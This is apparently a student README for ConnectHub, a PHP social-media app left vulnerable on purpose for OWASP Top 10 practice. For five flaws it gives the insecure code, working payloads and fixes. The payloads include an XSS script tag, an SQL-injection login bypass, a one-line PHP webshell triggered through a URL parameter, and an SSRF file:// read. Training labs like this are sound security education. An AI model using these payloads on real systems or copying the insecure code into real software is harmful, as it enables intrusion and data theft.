# 🔐 ConnectHub — Vulnerable Web Application
### Web Flaws: OWASP Top 10 in Action

![PHP](https://img.shields.io/badge/PHP-7.2%2B-777BB4?style=for-the-badge&logo=php&logoColor=white)
![MySQL](https://img.shields.io/badge/MySQL-MariaDB-4479A1?style=for-the-badge&logo=mysql&logoColor=white)
![XAMPP](https://img.shields.io/badge/Server-XAMPP-FB7A24?style=for-the-badge&logo=apache&logoColor=white)
![OWASP](https://img.shields.io/badge/OWASP-Top%2010-000000?style=for-the-badge&logo=owasp&logoColor=white)

> ⚠️ **WARNING:** This application is intentionally vulnerable. For educational and ethical hacking practice ONLY. Do NOT deploy on a public server.

**Presented by:** Ahmed Abdelsattar & Hassan Elsayed
**Faculty of Artificial Intelligence — Delta University for Science and Technology**

---

## 📖 Overview

**ConnectHub** is a deliberately vulnerable social media web application built to demonstrate real-world OWASP Top 10 security vulnerabilities in a controlled, hands-on environment.

It simulates a fully functional social platform with user registration, profile management, a public feed, file uploads, and an admin panel — while containing intentional security flaws that developers, students, and security professionals can safely identify, exploit, and learn to mitigate.

---

## 🎯 Purpose

- 🔍 **Identify** how common vulnerabilities are introduced in real applications
- 💥 **Exploit** them in a safe, local environment
- 🛡️ **Learn** proven mitigation techniques and secure coding practices
- 🏆 **Prepare** for bug bounty programs, CTFs, and certifications (CEH, OSCP)

---

## 🛠️ Tech Stack

| Layer | Technology |
|-------|-----------|
| **Backend** | PHP 7.2 |
| **Database** | MariaDB 10.4 (via phpMyAdmin) |
| **Server** | Apache (XAMPP) |
| **Frontend** | HTML5, CSS3, Vanilla JavaScript |
| **Auth** | PHP Sessions + Cookies |

---

## 🚨 Vulnerabilities Covered

| # | Vulnerability | OWASP Category | Severity |
|---|--------------|----------------|----------|
| 1 | **IDOR** — Insecure Direct Object References | Broken Access Control | 🟠 High |
| 2 | **XSS** — Cross-Site Scripting | Injection | 🔴 Critical |
| 3 | **SQLi** — SQL Injection (Auth Bypass) | Injection | 🔴 Critical |
| 4 | **File Upload Shell** — RCE via PHP webshell | Security Misconfiguration | 🔴 Critical |
| 5 | **SSRF** — Server-Side Request Forgery | SSRF | 🟠 High |

---

## ⚙️ Installation & Setup

### Prerequisites
- [XAMPP](https://www.apachefriends.org/) installed (Apache + MySQL)
- PHP 7.2+

### Steps

```bash
# 1. Clone the repository
git clone https://github.com/YOUR_USERNAME/connectHub.git

# 2. Move project to XAMPP web root
cp -r connectHub/project /path/to/xampp/htdocs/connectHub

# 3. Start Apache and MySQL from XAMPP Control Panel

# 4. Import the database
# Open: http://localhost/phpmyadmin
# Create database named: task
# Import file: project/task.sql

# 5. Open the app
# http://localhost/connectHub/project/


🔥 Vulnerability Details & Exploits
1. 🔓 IDOR — Insecure Direct Object References
Location: profile.php

http://localhost/connectHub/project/profile.php?id=3


Changing the id parameter grants access to any user’s profile with zero authorization checks.
Vulnerable Code:

$id = isset($_GET['id']) ? $_GET['id'] : $_SESSION['id'];
$query = "SELECT \* FROM users WHERE id = '$id' LIMIT 1";


Fix: Validate $id against $_SESSION['id'] and use prepared statements.

2. ⚡ XSS — Cross-Site Scripting
Location: search.php
Payload:

"><script>alert(9)</script>


Vulnerable Code:

$query = $_GET['query'];
echo "<h2>Search Results for '$query'</h2>";


Fix: Use htmlspecialchars($query, ENT_QUOTES, 'UTF-8') on all output.

3. 💉 SQL Injection — Authentication Bypass
Location: login.php
Payload:

Username: admin' AND 1=1 #
Password: anything


Resulting query:

SELECT * FROM users WHERE user_name = 'admin' AND 1=1 # AND password = 'anything'


Fix: Use prepared statements with bound parameters.

4. 🐚 File Upload — Remote Code Execution
Location: settings.php → Profile Picture Upload
Upload a PHP webshell disguised as an image:

<?php $c = $\_GET\['cmd'\]; system($c); ?>


Then trigger RCE:

http://localhost/connectHub/project/uploads/shell.php?cmd=whoami


Fix: Whitelist extensions, validate MIME type, rename files, store outside webroot.

5. 🌐 SSRF — Server-Side Request Forgery
Location: game.php — Puzzle Game URL fetcher
Payload:

file://C:\xampp\htdocs\connectHub\project\secrets.txt


The server reads and returns internal files directly.
Fix: Whitelist allowed URLs, disable file:// and ftp:// protocols, block localhost.

📁 Project Structure

connectHub/project/
├── index.php        # Landing page
├── login.php        # Login (SQLi vulnerable)
├── signup.php       # Registration
├── profile.php      # User profile (IDOR vulnerable)
├── search.php       # Search posts (XSS vulnerable)
├── settings.php     # Account settings (File Upload vulnerable)
├── game.php         # Puzzle game (SSRF vulnerable)
├── feed.php         # Public post feed
├── admin.php        # Admin panel
├── connection.php   # DB connection config
├── functions.php    # Helper functions
├── task.sql         # Database schema & seed data
└── uploads/         # Uploaded files directory


🛡️ Mitigation Summary



|Vulnerability  |Fix                                                 |
|---------------|----------------------------------------------------|
|IDOR           |Server-side authorization + prepared statements     |
|XSS            |`htmlspecialchars()` on all output + CSP headers    |
|SQL Injection  |Prepared statements / parameterized queries         |
|File Upload RCE|MIME validation + whitelist + store outside webroot |
|SSRF           |URL whitelist + block dangerous protocols + firewall|

📚 Learning Resources
	•	OWASP Top 10
	•	PortSwigger Web Security Academy
	•	HackTheBox Academy
	•	OWASP Cheat Sheet Series

⚠️ Disclaimer: This project is built strictly for educational purposes. All vulnerabilities are intentional. The authors are not responsible for any misuse. Always practice ethical hacking with proper authorization.

